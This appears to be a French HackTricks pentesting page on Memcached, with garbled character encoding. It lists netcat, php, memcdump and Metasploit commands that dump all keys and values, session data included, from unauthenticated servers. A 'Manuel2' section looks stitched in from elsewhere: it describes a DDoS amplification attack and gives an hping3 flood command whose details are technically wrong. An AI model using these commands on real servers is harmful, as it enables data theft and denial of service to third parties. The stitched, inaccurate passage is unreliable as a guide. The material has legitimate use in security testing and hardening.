# 11211 - Test de p√©n√©tration Memcache

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations sur le protocole

**Memcached** (prononciation : mem-cached, mem-cash-dee) est un syst√®me de mise en cache de m√©moire distribu√© √† usage g√©n√©ral. Il est souvent utilis√© pour acc√©l√©rer les sites Web dynamiques pilot√©s par une base de donn√©es en mettant en cache des donn√©es et des objets dans la RAM pour r√©duire le nombre de fois o√π une source de donn√©es externe (comme une base de donn√©es ou une API) doit √™tre lue. (De [wikipedia](https://en.wikipedia.org/wiki/Memcached))\
Bien que Memcached prenne en charge SASL, la plupart des instances sont **expos√©es sans authentification**.

**Port par d√©faut :** 11211
```
PORT      STATE SERVICE
11211/tcp open  unknown
```
## √ânum√©ration

### Manuel

Pour exfiltrer toutes les informations enregistr√©es dans une instance memcache, vous devez :

1. Trouver les **slabs** avec des **√©l√©ments actifs**
2. Obtenir les **noms de cl√©** des slabs d√©tect√©s pr√©c√©demment
3. Exfiltrer les **donn√©es enregistr√©es** en **obtenant les noms de cl√©**

Rappelez-vous que ce service est juste un **cache**, donc les **donn√©es peuvent appara√Ætre et dispara√Ætre**.
```bash
echo "version" | nc -vn -w 1 <IP> 11211      #Get version
echo "stats" | nc -vn -w 1 <IP> 11211        #Get status
echo "stats slabs" | nc -vn -w 1 <IP> 11211  #Get slabs
echo "stats items" | nc -vn -w 1 <IP> 11211  #Get items of slabs with info
echo "stats cachedump <number> 0" | nc -vn -w 1 <IP> 11211  #Get key names (the 0 is for unlimited output size)
echo "get <item_name>" | nc -vn -w 1 <IP> 11211  #Get saved info

#This php will just dump the keys, you need to use "get <item_name> later"
sudo apt-get install php-memcached
php -r '$c = new Memcached(); $c->addServer("localhost", 11211); var_dump( $c->getAllKeys() );'
```
### Manuel2

# Attaque Memcached

Memcached est un syst√®me de mise en cache distribu√© open source tr√®s populaire. Il est souvent utilis√© pour acc√©l√©rer les applications web en stockant en m√©moire des donn√©es fr√©quemment utilis√©es telles que des r√©sultats de requ√™tes de base de donn√©es ou des pages web g√©n√©r√©es dynamiquement.

Cependant, si Memcached est mal configur√©, il peut √™tre utilis√© pour mener des attaques DDoS massives. En effet, Memcached peut √™tre utilis√© pour amplifier le trafic en renvoyant des r√©ponses beaucoup plus grandes que les requ√™tes initiales.

## D√©couverte de Memcached

Memcached √©coute par d√©faut sur le port 11211. Pour v√©rifier si un serveur Memcached est en cours d'ex√©cution, vous pouvez utiliser la commande `nmap` suivante :

```
nmap -sU -p 11211 --script memcached-info <cible>
```

Si Memcached est en cours d'ex√©cution, vous devriez voir une sortie similaire √† celle-ci :

```
PORT      STATE SERVICE
11211/udp open  memcache
| memcached-info:
|   Process ID: 1
|   Uptime: 2 hours 1 min
|   Server time: 2021-06-22 14:22:08
|   Architecture: x86_64
|   Used CPU sys: 0.000000
|   Used CPU user: 0.000000
|   Current connections: 1
|   Total connections: 2
|   Maximum connections: 1024
|   TCP Port: 11211
|   UDP Port: 11211
|   Authenticated: no
|   Threads: 4
|   Forks: 1
|   Reserved file descriptors: 20
|   Available file descriptors: 1024
|   Total bytes read: 0
|   Total bytes written: 0
|   Bytes read per second: 0.00
|   Bytes written per second: 0.00
|   Total bytes: 0
|   Current bytes per connection: 0
|   Maximum bytes per connection: 0
|   Evictions: 0
|   Reclaimed: 0
|_  Get hits: 0
```

## Attaque Memcached DDoS

Pour mener une attaque DDoS Memcached, vous devez d'abord trouver des serveurs Memcached mal configur√©s qui r√©pondent aux requ√™tes UDP. Vous pouvez utiliser le script `memcrashed.py` pour cela :

```
python memcrashed.py <cible>
```

Le script enverra une requ√™te UDP √† tous les serveurs Memcached qu'il trouve et mesurera la taille de la r√©ponse. Si la r√©ponse est sup√©rieure √† 0, le serveur est vuln√©rable √† l'attaque DDoS Memcached.

Une fois que vous avez identifi√© des serveurs vuln√©rables, vous pouvez utiliser un outil d'attaque DDoS tel que `hping3` pour envoyer des paquets UDP falsifi√©s √† ces serveurs en utilisant l'adresse IP de la victime comme adresse source. Cela forcera les serveurs √† renvoyer des r√©ponses beaucoup plus grandes √† la victime, ce qui peut entra√Æner une surcharge du r√©seau de la victime.

```
hping3 -c 50000 -d 100 -S -w 64 -p 11211 --flood --rand-source <cible>
```

## Mitigation

Pour √©viter les attaques DDoS Memcached, il est important de configurer correctement les serveurs Memcached en limitant l'acc√®s aux adresses IP autoris√©es et en d√©sactivant l'√©coute UDP si elle n'est pas n√©cessaire. Les pare-feu et les syst√®mes de d√©tection d'intrusion peuvent √©galement √™tre utilis√©s pour d√©tecter et bloquer les attaques DDoS Memcached.
```bash
sudo apt install libmemcached-tools
memcstat --servers=127.0.0.1 #Get stats
memcdump --servers=127.0.0.1 #Get all items
memccat  --servers=127.0.0.1 <item1> <item2> <item3> #Get info inside the item(s)
```
### Automatique
```bash
nmap -n -sV --script memcached-info -p 11211 <IP>   #Just gather info
msf > use auxiliary/gather/memcached_extractor      #Extracts saved data
msf > use auxiliary/scanner/memcached/memcached_amp #Check is UDP DDoS amplification attack is possible 
```
## Dumping des cl√©s Memcache <a href="#dumping-memcache-keys" id="dumping-memcache-keys"></a>

**Si votre version de memcached est sup√©rieure √† 1.4.31, lisez la section suivante pour une m√©thode avanc√©e de dumping des cl√©s.**

Le protocole memcache fournit des [commandes](https://lzone.de/articles/memcached.htm) pour jeter un coup d'≈ìil aux donn√©es organis√©es par des dalles (cat√©gories de donn√©es d'une plage de taille donn√©e). Cependant, il y a certaines limitations significatives :

1. Vous ne pouvez jeter les cl√©s que par classe de dalle (cl√©s avec une taille de contenu approximativement similaire)
2. Vous ne pouvez jeter qu'une page par classe de dalle (1 Mo de donn√©es)
3. Il s'agit d'une fonctionnalit√© non officielle qui [peut √™tre supprim√©e √† tout moment.](https://groups.google.com/forum/?fromgroups=#!topic/memcached/1-T8I-RVGKM)

La deuxi√®me limitation est probablement la plus difficile car 1 Mo sur plusieurs gigaoctets, c'est presque rien. Cependant, cela peut √™tre utile pour surveiller comment vous utilisez un sous-ensemble de vos cl√©s. Mais cela peut d√©pendre de votre cas d'utilisation. Si vous ne vous souciez pas des d√©tails techniques, passez directement √† la [section outils](https://lzone.de/cheat-sheet/memcached#tools) pour en savoir plus sur les outils qui vous permettent de tout jeter facilement. Sinon, suivez le guide suivant et essayez les commandes [en utilisant telnet](https://lzone.de/articles/memcached.htm) contre votre configuration memcached. **Comment √ßa marche** Tout d'abord, vous devez savoir comment memcache organise sa m√©moire. Si vous d√©marrez memcache avec l'option "-vv", vous verrez les classes de dalle qu'il cr√©e. Par exemple
```
$ memcached -vv
slab class   1: chunk size        96 perslab   10922
slab class   2: chunk size       120 perslab    8738
slab class   3: chunk size       152 perslab    6898
slab class   4: chunk size       192 perslab    5461
[...]
```
Dans la configuration imprim√©e ci-dessus, memcache conservera 6898 morceaux de donn√©es entre 121 et 152 octets dans une seule dalle de 1 Mo (6898\*152). Toutes les dalles ont une taille de 1 Mo par d√©faut. Utilisez la commande suivante pour imprimer toutes les dalles existantes actuellement :
```
stats slabs
```
Si vous avez ajout√© une seule cl√© √† un memcached 1.4.13 vide avec
```
set mykey 0 60 1
1
STORED
```
vous verrez maintenant le r√©sultat suivant pour la commande "stats slabs":
```
stats slabs
STAT 1:chunk_size 96
STAT 1:chunks_per_page 10922
STAT 1:total_pages 1
STAT 1:total_chunks 10922
STAT 1:used_chunks 1
STAT 1:free_chunks 0
STAT 1:free_chunks_end 10921
STAT 1:mem_requested 71
STAT 1:get_hits 0
STAT 1:cmd_set 2
STAT 1:delete_hits 0
STAT 1:incr_hits 0
STAT 1:decr_hits 0
STAT 1:cas_hits 0
STAT 1:cas_badval 0
STAT 1:touch_hits 0
STAT active_slabs 1
STAT total_malloced 1048512
END
```
L'exemple montre que nous n'avons qu'un seul type de slab actif, le #1. Notre cl√©, qui ne fait qu'un octet, s'adapte √† la taille de chunk la plus petite possible. Les statistiques de slab montrent qu'il n'y a actuellement qu'une page de la classe de slab existante et qu'un seul chunk est utilis√©. **Le plus important est qu'il montre un compteur pour chaque op√©ration d'√©criture (set, incr, decr, cas, touch) et un pour les gets. En utilisant ceux-ci, vous pouvez d√©terminer un taux de r√©ussite !** Vous pouvez √©galement r√©cup√©rer un autre ensemble d'informations en utilisant "stats items" avec des compteurs int√©ressants concernant les √©victions et les compteurs de m√©moire insuffisante.
```
stats items
STAT items:1:number 1
STAT items:1:age 4
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
END
```
**Ce que nous pouvons deviner d√©j√†‚Ä¶** En se basant sur les informations statistiques par classe de dalles, nous pouvons d√©j√† deviner beaucoup de choses sur le comportement de l'application :

1. Quel est le ratio de cache pour diff√©rentes tailles de contenu ?
   * √Ä quel point le cache est-il efficace pour les gros morceaux de HTML ?
2. Combien de m√©moire d√©pensons-nous pour diff√©rentes tailles de contenu ?
   * Combien d√©pensons-nous pour des compteurs num√©riques simples ?
   * Combien d√©pensons-nous pour nos donn√©es de session ?
   * Combien d√©pensons-nous pour les gros morceaux de HTML ?
3. Combien d'objets volumineux pouvons-nous mettre en cache ?

Bien s√ªr, pour r√©pondre √† ces questions, vous devez conna√Ætre les objets mis en cache de votre application. **Maintenant : Comment extraire les cl√©s ?** Les cl√©s peuvent √™tre extraites par classe de dalles en utilisant la commande "stats cachedump".
```
stats cachedump <slab class> <number of items to dump>
```
Pour extraire notre cl√© unique dans la classe #1, ex√©cutez
```
stats cachedump 1 1000
ITEM mykey [1 b; 1350677968 s]
END
```
Le "cachedump" renvoie un √©l√©ment par ligne. Le premier nombre entre accolades donne la taille en octets, le second le timestamp de la cr√©ation. √âtant donn√© le nom de la cl√©, vous pouvez maintenant √©galement d√©verser sa valeur en utilisant.
```
get mykey
VALUE mykey 0 1
1
END
```
Voici comment proc√©der : it√©rez sur toutes les classes de slab que vous souhaitez, extrayez les noms de cl√©s et, si n√©cessaire, d√©versez leur contenu.

### **D√âVERSEMENT DES CL√âS MEMCACHE (VER 1.4.31+)**

Dans la version 1.4.31 et sup√©rieure de Memcache, il existe une nouvelle commande pour d√©verser les cl√©s de m√©moire en mode non-bloquant (lire https://github.com/memcached/memcached/wiki/ReleaseNotes1431). Cette m√©thode est s√ªre √† ex√©cuter en production. La sortie n'est pas coh√©rente, mais suffisamment bonne pour trouver les cl√©s, leur temps d'expiration exact (EXP) et le dernier temps d'acc√®s (LA). En raison de la grande quantit√© de sortie g√©n√©r√©e, il est recommand√© d'utiliser la commande ¬´ nc ¬ª. Exemples :
```
echo 'lru_crawler metadump all' | nc 127.0.0.1 11211 | head -1
key=0dLLX%253Amemcache_test_key exp=1590718787 la=1590718487 cas=2238881166 fetch=yes

echo 'lru_crawler metadump all' | nc 127.0.0.1 11211 | grep ee6ba58566e234ccbbce13f9a24f9a28
key=VQRFX%253Aee6ba58566e234ccbbce13f9a24f9a28 exp=-1 la=1590386157 cas=1776204003 fetch=yes
key=0dLLX%253Aee6ba58566e234ccbbce13f9a24f9a28 exp=-1 la=1590712292 cas=2225524871 fetch=yes
```
EXP=-1 signifie que l'√©l√©ment n'expire jamais. EXP=1590718787 (ven. 29 mai 2020 02:19:47 GMT) conserve le timestamp Unix indiquant quand l'√©l√©ment doit expirer. LA=1590712292 (lun. 25 mai 2020 05:55:57 GMT) conserve le timestamp Unix indiquant quand l'√©l√©ment a √©t√© acc√©d√© pour la derni√®re fois.

### **OUTILS DE DUMPING**

Il existe diff√©rents outils de dumping, parfois juste des scripts, qui vous aident √† imprimer les cl√©s memcache :

| Langages de programmation | Outils                                                                                                                             | Fonctionnalit√©                                                                                                                                                          |                                                                             |         |
| ------------------------ | ---------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------- | ------- |
| PHP                      | [simple script](http://snipt.org/xtP)                                                                                              | Imprime les noms de cl√©s.                                                                                                                                                      |                                                                             |         |
| Perl                     | [simple script](https://wiki.jasig.org/download/attachments/13572172/memcached-clean.pl?version=1\&modificationDate=1229693957401) | Imprime les noms et les valeurs des cl√©s.                                                                                                                                                 |                                                                             |         |
| Ruby                     | [simple script](https://gist.github.com/1365005)                                                                                   | Imprime les noms de cl√©s.                                                                                                                                                      |                                                                             |         |
| Perl                     | [memdump](https://search.cpan.org/\~dmaki/Memcached-libmemcached-0.4202/src/libmemcached/docs/memdump.pod)                         | Outil dans le module CPAN                                                                                                                                                    | [Memcached-libmemcached](https://search.cpan.org/\~dmaki/Memcached-libmemc) | ached/) |
| PHP                      | [memcache.php](http://livebookmark.net/journal/2008/05/21/memcachephp-stats-like-apcphp/)                                          | Interface graphique de surveillance de Memcache qui permet √©galement de vider les cl√©s.                                                                                                                  |                                                                             |         |
| libmemcached             | [peep](http://blog.evanweaver.com/2009/04/20/peeping-into-memcached/)                                                              | **G√®le votre processus memcached !!!** Soyez prudent lors de l'utilisation de cette m√©thode en production. En l'utilisant, vous pouvez contourner la limitation de 1 Mo et vraiment vider **toutes** les cl√©s. |                                                                             |         |

## D√©pannage <a href="#troubleshooting" id="troubleshooting"></a>

### Limite de donn√©es de 1 Mo <a href="#1mb-data-limit" id="1mb-data-limit"></a>

Notez qu'avant memcached 1.4, vous ne pouvez pas stocker d'objets de plus de 1 Mo en raison de la taille de slab maximale par d√©faut.

### Ne jamais d√©finir un d√©lai d'expiration > 30 jours ! <a href="#never-set-a-timeout--30-days" id="never-set-a-timeout--30-days"></a>

Si vous essayez de "d√©finir" ou "ajouter" une cl√© avec un d√©lai d'expiration sup√©rieur √† la dur√©e maximale autoris√©e, vous pourriez ne pas obtenir ce que vous attendez car memcached traite alors la valeur comme un timestamp Unix. De plus, si le timestamp est dans le pass√©, il ne fera rien du tout. Votre commande √©chouera silencieusement.

Donc, si vous voulez utiliser la dur√©e de vie maximale, sp√©cifiez 2592000. Exemple :
```
set my_key 0 2592000 1
1
```
### Cl√©s qui disparaissent en cas de d√©bordement <a href="#disappearing-keys-on-overflow" id="disappearing-keys-on-overflow"></a>

Malgr√© la documentation qui indique que le d√©bordement d'une valeur de 64 bits en utilisant "incr" provoque la disparition de la valeur, il est n√©cessaire de la recr√©er en utilisant "add"/"set".

### R√©plication <a href="#replication" id="replication"></a>

memcached ne prend pas en charge la r√©plication. Si vous en avez vraiment besoin, vous devez utiliser des solutions tierces :

* [repcached](http://repcached.lab.klab.org/) : R√©plication asynchrone multi-ma√Ætre (ensemble de correctifs memcached 1.2)
* [Interface memcached de Couchbase](http://www.couchbase.com/memcached) : Utilisez CouchBase comme remplacement de memcached
* [yrmcds](https://cybozu.github.io/yrmcds/) : Stockage de cl√©s-valeurs ma√Ætre-esclave compatible avec memcached
* [twemproxy](https://github.com/twitter/twemproxy) (alias nutcracker) : proxy avec prise en charge de memcached

### Liste de commandes

{% content-ref url="memcache-commands.md" %}
[memcache-commands.md](memcache-commands.md)
{% endcontent-ref %}

### **Shodan**

* `port:11211 "STAT pid"`
* `"STAT pid"`

## R√©f√©rences

* [https://lzone.de/cheat-sheet/memcached](https://lzone.de/cheat-sheet/memcached)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
